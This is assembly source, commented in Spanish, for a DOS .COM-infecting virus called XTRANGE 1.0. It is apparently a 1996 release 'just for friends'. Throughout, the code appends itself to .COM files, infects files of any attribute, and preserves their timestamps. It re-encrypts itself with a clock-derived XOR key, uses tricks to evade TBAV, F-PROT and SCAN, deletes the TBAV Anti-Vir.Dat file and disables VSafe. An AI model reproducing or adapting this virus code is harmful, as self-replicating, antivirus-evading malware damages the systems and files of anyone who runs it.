;ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
;บ Nombre : XTRANGE 1.0                                                      บ
;บ enumero caracteristicas:   * Appending .COM infector via SFT's            บ
;บ                            * Infecta archivos de cualquier atributo       บ
;บ                            * No modifica fecha ni hora del archivo        บ
;บ                            * Se activa el 1/1 de cualquier anio (silly)  บ
;บ                            * Marca la infeccion con el bit 6 de los       บ
;บ                              atributos...o sea, no reinfecta              บ
;บ                            * Se encripta cada vez con una clave diferente บ
;บ                            * Evade TOTALMENTE al : - TBAV 7.0             บ
;บ                                                    - F-PROT 2.22          บ
;บ                                                    - SCAN (jajajaja)      บ
;บ                            * No infecta COMMAND.COM :(                    บ
;บ                            * BORRA el Anti-Vir.Dat                        บ
;ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
COMIENZO_VIRUS:                       ;BUENO, LO TRADICIONAL,SACO DELTA OFFSET
Mov Bp,Sp                             ;SOLO QUE ASI EVADO AL TBAV Y EL F-PROT
Mov Ah,0                              ;NO ME DETECTA COMO VARIANTE DE UN VIRUS
Int 12h                               ;OBTENGO SP, LLAMO A UNA INT Y ASI TENGO
Mov Bp,[Bp-6]                         ;LA DIRECCION DE RETORNO, A LA QUE LE
Sub Bp,106h                           ;RESTO MI OFFSET ACTUAL Y LISTO
;---------------------------------------------------------------------------
Mov Ah,Clave + Bp                     ;BACKUPEO LA CLAVE ORIGINAL
Mov Clave2 + Bp,Ah                    ;PARA QUE NO SE PIERDA AL ELEGIR OTRA
                                      ;
Lea Si,Crypted + Bp                   ;COMIENZO DE LA ZONA ENCRIPTADA
Xor Cx,Cx                             ;CX=0 PORQUE LO USO DE CONTADOR

Mov Dh,Clave2 + Bp                    ;COPIO EN DH LA CLAVE A USAR
Call Fuck_Flag                        ;ESTO ES PARA EVADIR EL FLAG # DEL TBAV
                                      ;QUE INDICA ENCRIPTACION
                                      ;
Jmp All_Ok                            ;ACA SALTO A LA ZONA ENCRIPTADA
                                      ;
                                      ;
Fuck_Flag:                            ;SIGO CON EVADIR AL TBAV
Call Lets_Start                       ; "    "    "    "   "
Ret                                   ; "    "    "    "   "
Mov Ah,4Ch                            ; "    "    "    "   "
Int 21h                               ; "    "    "    "   "
                                      ; "    "    "    "   "
Lets_Start:                           ; "    "    "    "   "
Mov Ah,1                              ;ACA LLAMO A UNA FUNCION CUALQUIERA
Int 13h                               ;SOLO PARA SEGUIR JODIENDO AL TBAV
                                      ;
Xor_Loop:                             ;
Mov Ah,[Si]                           ;EMPIEZO A DESENCRIPTAR Y UTILIZO
Xor Ah,Dh                             ;A CX PARA CONTAR
Mov [Si],Ah                           ;OJO QUE ESTA RUTINA TAMBIEN ENCRIPTA
Inc Cx                                ;
Inc Si                                ;
Cmp Cx,Enc_Size                       ;
Jbe Xor_Loop                          ;
Ret                                   ;
                                      ;
Clave      Db 0                       ;DATOS...
Clave2     Db 0                       ;
N_Enc_Size Equ $ - Comienzo_Virus     ;
;---------------------------------------------------------------------------
Crypted:                              ;COMIENZO MI VIRUS YA DESENCRIPTADO
All_Ok:                               ;
Mov Ax,4300h                          ;
Mov Al,1                              ;CHAU ANTI-VIR.DAT
Mov Cx,0                              ;
Lea Dx,TBAV + Bp                      ;
Int 21h                               ;
Mov Ax,4100h                          ;
Int 21h                               ;
;---------------------------------------------------------------------------
Mov Old_Es + Bp, Es                   ;GRABO ES. DESPUES CAMBIA POR USO DE
                                      ;SFT
;---------------------------------------------------------------------------
Xor Ah,Ah                             ;PONGO AH A 0 PORQUE PRIMERO TENGO
Mov Vsafe + Bp,Ah                     ;QUE SACAR LOS FLAGS DEL VSAFE
                                      ;O SEA, ME ASEGURO QUE LA PRIMERA VEZ
                                      ;QUE LLAME A LA RUTINA DE MANEJO DE
                                      ;FLAGS, LOS FLAGS TODOS ESTEN EN 0 PARA
                                      ;DESACTIVAR (PORQUE AL INFECTAR EL 
                                      ;ARCHIVO, GUARDE LOS FLAGS ORIGINALES
                                      ;PERO VIEJOS DEL MOMENTO DE LA INFECCION)
                                      ;LA PROXIMA VEZ QUE LLAME A LA RUTINA, 
                                      ;SE REPONDRAN LOS FLAGS ORIGINALES.
;---------------------------------------------------------------------------
Call Chau_Vsafe                       ;JUSTAMENTE ACA
;---------------------------------------------------------------------------
BACKUPEO_LOS_BYTES_ORIGINALES:        ;GRABO LOS BYTES A RESTAURAR EN OTRO
Lea Si,Buffer + Bp                    ;LADO, PORQUE SINO, LOS ORIGINALES
Lea Di,Backup + Bp                    ;SE SOBREESCRIBEN CADA VEZ QUE LEO
MovSw                                 ;LOS 3 PRIMEROS DE CADA NUEVO HOST
MovSb                                 ;DESPUES RESTITUYO EL BACKUP
;---------------------------------------------------------------------------
PLAYLOAD:                             ;BUENO, UN PLAYLOAD BIEN SENCILLO:
Mov Ax,2A00h                          ;
Int 21h                               ;
                                      ;
Cmp Dh,01                             ;
Jne Backupeo_El_DTA                   ;SI ES 1/1  
                                      ;CUALQUIER ANO, IMPRIME UN MENSAJE
Cmp Dl,01                             ;
Jne Backupeo_El_DTA                   ;
                                      ;
Lea Dx,Mensaje + Bp                   ;
                                      ;
LETS_DO_IT:                           ;
Mov Ax,0003                           ;
Int 10h                               ;
Mov Ah,9                              ;
Int 21h                               ;
Mov Ah,1                              ;
Int 21h                               ;
;---------------------------------------------------------------------------
BACKUPEO_EL_DTA:                      ;GRABO EL DTA PORQUE LA FUNCION
Lea Si,80h                            ;4EH LO SOBREESCRIBE.
Lea Di, DTA + Bp                      ;DESPUES LO RESTITUYO
Mov Cx,43                             ;
Rep MovSb                             ;
;---------------------------------------------------------------------------
SETEO_PARA_BUSCAR_COM:                ;BUSCO EL PRIMER .COM PARA INFECTAR
Mov Ax,4E00h                          ;CON CUALQUIER ATRIBUTO:
Mov Cx,00100111b                      ;HIDDEN - READ ONLY - SYSTEM Y LOS
Lea Dx,Mask + Bp                      ;COMUNES
BUSCO:                                ;
Int 21h                               ;
If C Jmp Chiao                        ;
;---------------------------------------------------------------------------
ABRO_COM:                             ;ABRO EL COM PARA SOLO LECTURA
Mov Ax,3D00h                          ;ASI LOS ANTIVIRUS NO CHILLAN 
Mov Dx,9Eh                            ;OBTENGO EL NOMBRE DEL DTA
Int 21h                               ;GRABO EL HANDLE Y LO RECUPERO EN BX
Xchg Bx,Ax                            ;
;---------------------------------------------------------------------------
OBTENGO_TAMANIO_DEL_COM:              ;OBTENGO EL TAMANIO DEL COM DEL DTA
Mov Si,9Ah                            ;
Lea Di,Tam + Bp                       ;
MovSw                                 ;
;---------------------------------------------------------------------------
OBTENGO_NOMBRE_DEL_COM:               ;OBTENGO EL NOMBRE DEL COM DEL DTA
Mov Si,9Eh                            ;
Lea Di,File + Bp                      ;
Mov Cx,12                             ;
Rep MovSb                             ;
;---------------------------------------------------------------------------
ES_EL_COMMAND?:                       ;VERIFICO SI ES EL COMMAND. SI ES, LO
Lea Si,File + Bp                      ;CIERRO Y BUSCO OTRO, SINO SIGO
Lea Di,Command + Bp                   ;
Mov Cx,12                             ;
Rep CmpSb                             ;
If E Jmp Otro_Com                     ;
;---------------------------------------------------------------------------
OBTENGO_SFT:                          ;OBTENGO LA SFT DEL ARCHIVO
Push Bx                               ;
Mov Ax,1220h                          ;
Int 2Fh                               ;
                                      ;
Mov Bl,Es:[Di]                        ;
Mov Ax,1216h                          ;
Int 2Fh                               ;
Mov Sft + Bp,Es:Di                    ;
;---------------------------------------------------------------------------
ESTA_INFECTADO?:                      ;VERIFICO LA MARCA DE INFECCION
Mov  Dh,[Es:Di + 4]                   ;BIT 6 DE LOS ATRIBUTOS EN 1
Test Dh, Bit 6                        ;SI ESTA, CIERRO Y BUSCO OTRO
Jnz Otro_Com                          ;
;---------------------------------------------------------------------------
ABRO_PARA_LECTURA_ESCRITURA:          ;MODIFICO LA FORMA DE ACCESO AL
Mov Dx,2                              ;ARCHIVO PARA PODER LEER Y ESCRIBIR
Mov [Es:Di + 2],Dx                    ;
;---------------------------------------------------------------------------
LEO_BYTES:                            ;LEO LOS TRES PRIMEROS BYTES
Mov Ax,3F00h                          ;LOS GRABO EN BUFFER (QUE ANTES TENIA
Mov Cx,3                              ;LOS BYTES DEL HOST PARA RESTAURAR, POR
Lea Dx,Buffer + Bp                    ;ESO "BACKUPIE")
Pop Bx                                ;
Int 21h                               ;
;---------------------------------------------------------------------------
PUNTERO_AL_PRINCIPIO:                 ;MUEVO EL PUNTERO AL PRINCIPIO
Mov Ax,4200h                          ;
Xor Cx,Cx                             ;
Cwd                                   ;
Int 21h                               ;
;---------------------------------------------------------------------------
ESCRIBO_JUMP:                         ;ESCRIBO EL SALTO
Mov Ax,4000h                          ;
Mov Cx,1                              ;
Lea Dx,Jump + Bp                      ;
Int 21h                               ;
;---------------------------------------------------------------------------
ESCRIBO_FINAL_DEL_JUMP:               ;ESCRIBO LA DIRECCION DEL SALTO
Sub Word Ptr [Bp+Tam],3               ;(TAMANIO DEL HOST)
                                      ;
Mov Ax,4000h                          ;
Mov Cx,2                              ;
Lea Dx,Tam + Bp                       ;
Int 21h                               ;
Jmp Copio_Virus
;---------------------------------------------------------------------------
Otro_Com:
Jmp Otro_Com2
;---------------------------------------------------------------------------
COPIO_VIRUS:                          ;MUEVO EL PUNTERO AL FINAL DEL
Mov Ax,4202h                          ;ARCHIVO Y GRABO EL VIRUS
Xor Cx,Cx                             ;DE ESTA MANERA:
Cwd                                   ;
Int 21h                               ;
Add Word Ptr [Bp+Tam],3               ;
                                      ;
Push Es                               ;GRABO ES PORQUE CAMBIA AHORA !
Push Di
Mov Es, Old_Es + Bp                   ;
                                      ;
Mov Ah,2Ch                            ;ELIJO UNA NUEVA CLAVE USANDO EL
Int 21h                               ;RELOJ
Mov Bp + Clave, Dl                    ;

Lea Si,[Bp + Crypted]                 ;COPIO LA ZONA A ENCRIPTAR AL FINAL DEL
Lea Di,Fin + Bp                       ;VIRUS
Mov Cx,Enc_Size                       ;
Rep Movsb                             ;
                                      ;
Lea Si,[Es:Bp + Fin]                  ;APUNTO A ESA ZONA Y EMPIEZO A ENCRIPTAR
Xor Cx,Cx                             ;
                                      ;
Mov Dh,Bp + Clave                     ;COPIO LA CLAVE EN DH
Call Xor_Loop                         ;            
                                      ;
Mov Ax,4000h                          ;GRABO POR SEPARADO LA PARTE NO 
Mov Cx,N_Enc_Size                     ;ENCRIPTADA Y LA PARTE ENCRIPTADA
Lea Dx,[Bp + Comienzo_Virus]          ;
Int 21h                               ;
                                      ;
Mov Ax,4000h                          ;
Mov Cx,Enc_Size                       ;
Lea Dx,[Es:Bp + Fin]                  ;
Int 21h                               ;
                                      ;
Pop Di                                ;RECUPERO ES
Pop Es
;---------------------------------------------------------------------------
MARCA_DE_INFECCION:                   ;LE ESTAMPO LA MARCA DE INFECCION
Mov Dh,[Es:Di + 4]                    ;EL "ATRIBUTO NO VALIDO" DEL BIT 6
Or  Dh, Bit 6                         ;
Mov [Es:Di + 4],Dh                    ;
;---------------------------------------------------------------------------
NO_MODIFICO_FECHA_NI_HORA:            ;SETEO EL BIT 14 PARA QUE NO SE
Or  [Es:Di + 5],Bit 14                ;MODIFIQUE LA FECHA Y LA HORA
;---------------------------------------------------------------------------
OTRO_COM2:                            ;
Mov Es,Old_Es + Bp                    ;
                                      ;
Mov Ax,3E00h                          ;CIERRO Y BUSCO OTRO COM
Int 21h                               ;
Mov Ax,4F00h                          ;
Jmp Busco                             ;
;----------------------------------------------------------------------------
CHIAO:                                ;SI NO HAY MAS COM VENGO ACA Y
RESTAURO_DTA:                         ;
Call Chau_Vsafe                       ;
                                      ;
Mov Es,Old_Es + Bp                    ;RECUPERO ES ORIGINAL
                                      ;
Mov Di,80h                            ;
Lea Si, DTA + Bp                      ;RESTAURO EL DTA
Mov Cx,43                             ;
Rep MovSb                             ;
                                      ;
RESTAURO_BYTES_DEL_HOST:              ;RESTAURO EL BACKUP (LOS BYTES ORIGINALES
Mov Cx,3                              ;DEL HOST) EN 100H PARA SALTAR
Mov Di,100h                           ;
Lea Si,Backup + Bp                    ;
MovSw                                 ;
MovSb                                 ;
                                      ;
Push 100h                             ;SALTO
Ret -1                                ; 
;----------------------------------------------------------------------------
Chau_Vsafe:                           ;ACA GARCO AL VSAFE
Mov Ax,0FA02h                         ;
Mov Dx,5945h                          ;SUPONGO QUE YA CONOCERAN EL METODO
Mov Bl,Vsafe + Bp                     ;NO? :)
Int 21h                               ;
Mov Vsafe + Bp,Cl                     ;
Ret                                   ;
;----------------------------------------------------------------------------
VARIABLES:
Mensaje    Db 'Hello world!',0a,0d
           Db 'virus experimental XTRANGE 0.1แ Beta release! just for friends :)',0a,0d
           Db '- CopyRight 1996 - xxx',0a,0d,'$'
Command    Db 'COMMAND.COM',0
TBAV       Db 'Anti-Vir.Dat',0
Mask       Db '*.COM',0
Jump       Db '้'
Tam        Dw 0
File       Db 12 Dup(0)
Sft        Dw 0
Vsafe      Db 0
Old_Es     Dw 0
DTA        Db 43 Dup(0)
Buffer     Db 0CDh,20h,90h
Backup     Db 3 Dup(0)
Enc_Size   Equ $ - Crypted
;----------------------------------------------------------------------------
Virii_Tam  Equ $ - Comienzo_Virus
Fin:
